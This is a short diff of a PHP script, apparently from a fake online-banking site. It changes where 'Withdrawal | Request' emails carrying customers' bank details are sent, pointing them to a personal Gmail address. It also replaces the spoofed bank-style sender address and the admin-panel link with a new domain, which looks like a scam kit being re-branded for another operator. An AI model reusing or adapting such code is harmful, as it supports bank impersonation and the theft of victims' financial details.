@@ -357,9 +357,9 @@ Bank Adress: ".$b_address ."
 
                                                     $name1 = "Chief";
 
-                                                    $to = "loandrasale@gmail.com"; // this is your Email address
+                                                    $to = "bryanjohn2044@gmail.com"; // this is your Email address
 
-                                                    $from = "info@bankrcu.com"; // this is the sender's Email address
+                                                    $from = "cdfb.com"; // this is the sender's Email address
 
                                                     $subject2 = "Withdrawal | Request";
 
@@ -399,7 +399,7 @@ Bank Adress: " . $b_address . "
 
 Sign into your Admin panel to effect the transaction:
 
-http://www.account.bankrcu.com/zap
+http://www.cdfb.com/zap
 
   
 
